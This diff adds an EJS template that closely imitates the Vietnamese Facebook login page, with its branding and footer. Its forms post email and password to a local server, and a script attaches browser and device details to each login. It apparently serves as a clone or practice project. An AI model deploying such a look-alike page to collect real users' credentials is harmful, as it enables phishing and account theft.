@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Đăng nhập hoặc đăng ký</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/2048px-2023_Facebook_icon.svg.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      color: #1c1e21;
+      line-height: 1.34;
+    }
+
+    .facebook-login-page {
+      background: #f0f2f5;
+    }
+
+    .main-content {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 980px;
+      width: 100%;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 32px;
+      align-items: center;
+    }
+
+    .left-section {
+      flex: 1;
+      min-width: 300px;
+    }
+
+    .logo {
+      color: #1877f2;
+      font-size: 60px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .tagline {
+      font-size: 28px;
+      font-weight: normal;
+      max-width: 500px;
+    }
+
+    .right-section {
+      flex: 1;
+      min-width: 300px;
+    }
+
+    .login-box {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+      padding: 20px;
+      text-align: center;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+      background: white;
+    }
+
+    .input-field:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+      outline: none;
+    }
+
+    .login-btn {
+      width: 100%;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      line-height: 48px;
+      margin: 10px 0;
+    }
+
+    .login-btn:hover {
+      background: #166fe5;
+    }
+
+    .forgot-password {
+      color: #1877f2;
+      background: none;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 15px 0;
+      width: 100%;
+      text-align: center;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-account-btn {
+      background: #42b72a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      line-height: 44px;
+      padding: 0 24px;
+      height: 44px;
+      display: inline-block;
+      margin: 0 auto;
+    }
+
+    .create-account-btn:hover {
+      background: #36a420;
+    }
+
+    .page-link {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .page-link a {
+      color: #090909;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .page-link a:hover {
+      text-decoration: underline;
+    }
+
+    .error-msg {
+      color: #d93025;
+      font-size: 14px;
+      margin: 10px 0;
+    }
+
+    .success-msg {
+      color: #00a400;
+      font-size: 14px;
+      margin: 10px 0;
+      background: #d4edda;
+      padding: 12px;
+      border-radius: 6px;
+      border: 1px solid #00a400;
+    }
+
+    /* Modal chung */
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-content {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 12px 28px rgba(0,0,0,0.3);
+      position: relative;
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    /* Modal Đăng ký */
+    .register-modal {
+      max-width: 432px;
+      padding: 20px 24px 28px;
+    }
+
+    .close-modal {
+      position: absolute;
+      right: 16px;
+      top: 12px;
+      font-size: 40px;
+      font-weight: bold;
+      color: #606770;
+      background: none;
+      border: none;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .close-modal:hover {
+      color: #1c1e21;
+    }
+
+    .modal-header h2 {
+      font-size: 32px;
+      font-weight: bold;
+      margin: 0 0 8px;
+      line-height: 38px;
+    }
+
+    .modal-header p {
+      font-size: 15px;
+      color: #606770;
+      margin: 0 0 16px;
+    }
+
+    .name-fields {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .name-fields .input-field {
+      flex: 1;
+    }
+
+    .label {
+      display: block;
+      font-size: 12px;
+      color: #606770;
+      font-weight: 600;
+      margin-bottom: 4px;
+      text-align: left;
+    }
+
+    .birthday-section {
+      margin: 16px 0 20px;
+    }
+
+    .birthday-hint {
+      font-size: 12px;
+      color: #606770;
+      margin: 4px 0 8px;
+      text-align: left;
+    }
+
+    .birthday-selects {
+      display: flex;
+      gap: 12px;
+    }
+
+    .birthday-selects select {
+      flex: 1;
+      padding: 10px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      background: white;
+      cursor: pointer;
+    }
+
+    .gender-section {
+      margin-bottom: 20px;
+    }
+
+    .gender-options {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .gender-label {
+      flex: 1;
+      padding: 10px 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      cursor: pointer;
+      text-align: center;
+      font-size: 16px;
+      min-width: 100px;
+      background: white;
+    }
+
+    .gender-label input {
+      margin-right: 8px;
+    }
+
+    .privacy-text {
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+      margin: 16px 0 24px;
+      line-height: 1.4;
+    }
+
+    .privacy-text a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .privacy-text a:hover {
+      text-decoration: underline;
+    }
+
+    .register-btn {
+      width: 100%;
+      background: #00a400;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 12px 0;
+      cursor: pointer;
+    }
+
+    .register-btn:hover {
+      background: #009200;
+    }
+
+    /* Modal Quên mật khẩu */
+    .forgot-modal {
+      max-width: 432px;
+      padding: 24px 28px 32px;
+    }
+
+    .forgot-instruction {
+      font-size: 15px;
+      color: #606770;
+      margin: 16px 0 24px;
+      line-height: 1.4;
+    }
+
+    .forgot-input {
+      margin-bottom: 20px;
+      font-size: 17px;
+    }
+
+    .forgot-message {
+      font-size: 14px;
+      color: #1877f2;
+      text-align: center;
+      margin: 16px 0;
+      line-height: 1.4;
+    }
+
+    .search-btn {
+      width: 100%;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 12px 0;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .search-btn:hover {
+      background: #166fe5;
+    }
+
+    /* Footer */
+    .footer {
+      background: white;
+      padding: 40px 20px;
+      border-top: 1px solid #dddfe2;
+      margin-top: 60px;
+    }
+
+    .footer-content {
+      max-width: 980px;
+      margin: auto;
+      text-align: center;
+    }
+
+    .languages, .footer-links {
+      margin: 0 auto;
+    }
+
+    .languages a,
+    .footer-links a,
+    .languages button {
+      color: #737373;
+      font-size: 12px;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .languages button {
+      border: none;
+      background: none;
+      cursor: pointer;
+    }
+
+    .languages a:hover,
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-divider {
+      border-top: 1px solid #dddfe2;
+      margin: 10px 0;
+    }
+
+    .copyright {
+      margin-top: 20px;
+      color: #737373;
+      font-size: 11px;
+    }
+
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+        text-align: center;
+      }
+      .left-section {
+        text-align: center;
+        margin-bottom: 40px;
+      }
+      .logo {
+        font-size: 50px;
+      }
+      .tagline {
+        font-size: 24px;
+      }
+      .register-modal, .forgot-modal {
+        max-width: 90%;
+        margin: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="facebook-login-page">
+    <!-- Main Content -->
+    <div class="main-content">
+      <div class="container">
+        <div class="left-section">
+          <h1 class="logo">facebook</h1>
+          <p class="tagline">
+            Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.
+          </p>
+        </div>
+
+        <div class="right-section">
+          <div class="login-box">
+            <form action="/login" method="POST" id="loginForm">
+              <input
+                type="text"
+                name="email"
+                placeholder="Email hoặc số điện thoại"
+                class="input-field"
+                required
+              />
+              <input
+                type="password"
+                name="password"
+                placeholder="Mật khẩu"
+                class="input-field"
+                required
+              />
+
+              <% if (typeof error !== 'undefined' && error) { %>
+                <div class="error-msg"><%= error %></div>
+              <% } %>
+
+              <% if (typeof success !== 'undefined' && success) { %>
+                <div class="success-msg"><%= success %></div>
+              <% } %>
+
+              <button type="submit" class="login-btn">
+                Đăng nhập
+              </button>
+            </form>
+
+            <button type="button" class="forgot-password" onclick="openForgotModal()">
+              Quên mật khẩu?
+            </button>
+
+            <div class="divider"></div>
+
+            <button type="button" class="create-account-btn" onclick="openRegisterModal()">
+              Tạo tài khoản mới
+            </button>
+          </div>
+
+          <div class="page-link">
+            <p>
+              <a href="#">Tạo Trang</a> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.
+            </p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="footer-content">
+        <div class="languages">
+          <a href="#">Tiếng Việt</a> · <a href="#">English (UK)</a> · <a href="#">中文(台灣)</a> ·
+          <a href="#">한국어</a> · <a href="#">日本語</a> · <a href="#">Français (France)</a> ·
+          <a href="#">ภาษาไทย</a> · <a href="#">Español</a> · <a href="#">Português (Brasil)</a> ·
+          <a href="#">Deutsch</a> · <a href="#">Italiano</a> ·
+          <button>+</button>
+        </div>
+
+        <div class="footer-divider"></div>
+
+        <div class="footer-links">
+          <a href="#">Sign up</a> · <a href="#">Log in</a> · <a href="#">Messenger</a> ·
+          <a href="#">Facebook Lite</a> · <a href="#">Video</a> · <a href="#">Meta Pay</a> ·
+          <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Ray-Ban Meta</a> ·
+          <a href="#">Meta AI</a> · <a href="#">Instagram</a> · <a href="#">Threads</a> ·
+          <a href="#">Voting Information Centre</a> · <a href="#">Privacy Policy</a> ·
+          <a href="#">Privacy Centre</a> · <a href="#">About</a> · <a href="#">Create ad</a> ·
+          <a href="#">Create Page</a> · <a href="#">Developers</a> · <a href="#">Careers</a> ·
+          <a href="#">Cookies</a> · <a href="#">AdChoices</a> · <a href="#">Terms</a> ·
+          <a href="#">Help</a> · <a href="#">Contact uploading and non-users</a> ·
+          <a href="#">Settings</a> · <a href="#">Activity log</a>
+        </div>
+
+        <div class="footer-divider"></div>
+
+        <div class="copyright">
+          <p>Meta © 2026</p>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Modal Đăng ký -->
+    <div class="modal" id="registerModal">
+      <div class="modal-content register-modal">
+        <button class="close-modal" onclick="closeRegisterModal()" aria-label="Close">×</button>
+
+        <div class="modal-header">
+          <h2>Tạo tài khoản mới</h2>
+          <p>Nhanh chóng và dễ dàng.</p>
+        </div>
+
+        <div class="error-msg" id="registerError" style="display: none;"></div>
+
+        <form action="/register" method="POST" id="registerForm">
+          <div class="name-fields">
+            <input
+              placeholder="Họ"
+              name="firstName"
+              class="input-field"
+              required
+            />
+            <input
+              placeholder="Tên"
+              name="lastName"
+              class="input-field"
+              required
+            />
+          </div>
+
+          <input
+            type="text"
+            name="email"
+            placeholder="Số di động hoặc email"
+            class="input-field"
+            required
+          />
+
+          <input
+            type="password"
+            name="password"
+            placeholder="Mật khẩu mới"
+            class="input-field"
+            required
+          />
+
+          <div class="birthday-section">
+            <label class="label">Ngày sinh</label>
+            <p class="birthday-hint">
+              Đây là thông tin công khai. Bạn có thể thay đổi ai thấy thông tin này sau.
+            </p>
+            <div class="birthday-selects">
+              <select name="day" required>
+                <% for(let i = 1; i <= 31; i++) { %>
+                  <option value="<%= i %>"><%= i %></option>
+                <% } %>
+              </select>
+
+              <select name="month" required>
+                <% for(let i = 1; i <= 12; i++) { %>
+                  <option value="<%= i %>">Tháng <%= i %></option>
+                <% } %>
+              </select>
+
+              <select name="year" required>
+                <% const currentYear = new Date().getFullYear(); %>
+                <% for(let i = 0; i <= 120; i++) { %>
+                  <option value="<%= currentYear - i %>"><%= currentYear - i %></option>
+                <% } %>
+              </select>
+            </div>
+          </div>
+
+          <div class="gender-section">
+            <label class="label">Giới tính</label>
+            <div class="gender-options">
+              <label class="gender-label">
+                <input type="radio" name="gender" value="female" required />
+                Nữ
+              </label>
+              <label class="gender-label">
+                <input type="radio" name="gender" value="male" />
+                Nam
+              </label>
+              <label class="gender-label">
+                <input type="radio" name="gender" value="custom" checked />
+                Tùy chỉnh
+              </label>
+            </div>
+          </div>
+
+          <p class="privacy-text">
+            Bằng cách nhấp vào Đăng ký, bạn đồng ý với
+            <a href="#">Điều khoản</a>, <a href="#">Chính sách dữ liệu</a> và
+            <a href="#">Chính sách cookie</a> của chúng tôi. Bạn có thể nhận được thông báo từ chúng tôi qua email và có thể hủy đăng ký bất kỳ lúc nào.
+          </p>
+
+          <button type="submit" class="register-btn">
+            Đăng ký
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Modal Quên mật khẩu -->
+    <div class="modal" id="forgotModal">
+      <div class="modal-content forgot-modal">
+        <button class="close-modal" onclick="closeForgotModal()" aria-label="Close">×</button>
+
+        <div class="modal-header">
+          <h2>Tìm tài khoản của bạn</h2>
+        </div>
+
+        <p class="forgot-instruction">
+          Vui lòng nhập email hoặc số di động liên kết với tài khoản của bạn để tìm kiếm.
+        </p>
+
+        <form action="/forgot-password" method="POST" id="forgotForm">
+          <input
+            type="text"
+            name="email"
+            placeholder="Email hoặc số di động"
+            class="input-field forgot-input"
+            autofocus
+            required
+          />
+
+          <div class="forgot-message" id="forgotMessage" style="display: none;"></div>
+
+          <button type="submit" class="search-btn">
+            Tìm kiếm
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Modal Functions
+    function openRegisterModal() {
+      document.getElementById('registerModal').classList.add('active');
+    }
+
+    function closeRegisterModal() {
+      document.getElementById('registerModal').classList.remove('active');
+      document.getElementById('registerError').style.display = 'none';
+    }
+
+    function openForgotModal() {
+      document.getElementById('forgotModal').classList.add('active');
+    }
+
+    function closeForgotModal() {
+      document.getElementById('forgotModal').classList.remove('active');
+      document.getElementById('forgotMessage').style.display = 'none';
+    }
+
+    // Close modal when clicking outside
+    window.onclick = function(event) {
+      const registerModal = document.getElementById('registerModal');
+      const forgotModal = document.getElementById('forgotModal');
+      
+      if (event.target === registerModal) {
+        closeRegisterModal();
+      }
+      if (event.target === forgotModal) {
+        closeForgotModal();
+      }
+    }
+
+    // Handle register form submission
+    document.getElementById('registerForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const formData = new FormData(this);
+      const data = Object.fromEntries(formData.entries());
+      
+      try {
+        const response = await fetch('/register', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          // Đăng ký thành công - chuyển về trang login
+          window.location.href = "http://localhost:9999/login";
+        } else {
+          // Hiển thị lỗi
+          const errorDiv = document.getElementById('registerError');
+          errorDiv.textContent = result.error;
+          errorDiv.style.display = 'block';
+        }
+      } catch (error) {
+        const errorDiv = document.getElementById('registerError');
+        errorDiv.textContent = 'Đã xảy ra lỗi. Vui lòng thử lại!';
+        errorDiv.style.display = 'block';
+      }
+    });
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+
+      let deviceType = 'Desktop';
+      if (/mobile/i.test(ua)) deviceType = 'Mobile';
+      if (/tablet/i.test(ua)) deviceType = 'Tablet';
+
+      let os = 'Unknown OS';
+      if (/windows/i.test(ua)) os = 'Windows';
+      else if (/mac os/i.test(ua)) os = 'macOS';
+      else if (/android/i.test(ua)) os = 'Android';
+      else if (/iphone|ipad/i.test(ua)) os = 'iOS';
+
+      let browser = 'Unknown Browser';
+      if (/chrome/i.test(ua)) browser = 'Chrome';
+      else if (/edg/i.test(ua)) browser = 'Edge';
+      else if (/firefox/i.test(ua)) browser = 'Firefox';
+      else if (/safari/i.test(ua)) browser = 'Safari';
+
+      return { deviceType, os, browser };
+    }
+
+    // Handle login form with device info
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      const deviceInfo = getDeviceInfo();
+      
+      // Add hidden inputs for device info
+      const deviceInput = document.createElement('input');
+      deviceInput.type = 'hidden';
+      deviceInput.name = 'deviceInfo';
+      deviceInput.value = JSON.stringify(deviceInfo);
+      this.appendChild(deviceInput);
+    });
+  </script>
+</body>
+</html>
